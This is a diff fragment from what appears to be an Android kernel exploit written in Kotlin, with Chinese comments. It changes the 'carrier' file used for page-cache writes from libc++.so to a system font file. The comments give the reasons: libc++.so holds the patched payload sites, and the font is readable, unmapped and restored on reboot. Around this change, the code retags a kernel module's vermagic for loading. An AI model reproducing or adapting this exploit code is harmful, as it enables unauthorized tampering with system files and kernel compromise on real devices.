@@ -1396,7 +1396,11 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                  */
                 val moduleBytes = retagVermagic(moduleBytesRaw) { line -> step(line) }
                 step("typed: module bytes=" + moduleBytes.size)
-                val carrierPath = "/system/lib64/libc++.so"   /* 可直读 ⇒ 写路径走 file_fd 直连（毫秒级）；不可读的 /vendor 载体被迫逐块 fork helper（已实测 23ms/次） */
+                /*
+                 * 可直读 **且无人映射** 的大文件：libc++.so 不能当载体（它正是我们改站点/载荷的那个文件，写 0 偏移会毁它 ✗），
+                 * 字体文件 32 MB、真机实测 mapped_by=0、可读 ⇒ 直连 pread（每块 ~3.4 ms），写坏只是页缓存、重启即复原。
+                 */
+                val carrierPath = "/system/fonts/NotoSansCJK-Regular.ttc"   /* 可直读 ⇒ 写路径走 file_fd 直连（毫秒级）；不可读的 /vendor 载体被迫逐块 fork helper（已实测 23ms/次） */
                 meter.before("Native43284.create", "(module session)")
                 val moduleHandle = Native43284.create()
                 meter.after("Native43284.create", "handle=" + moduleHandle)
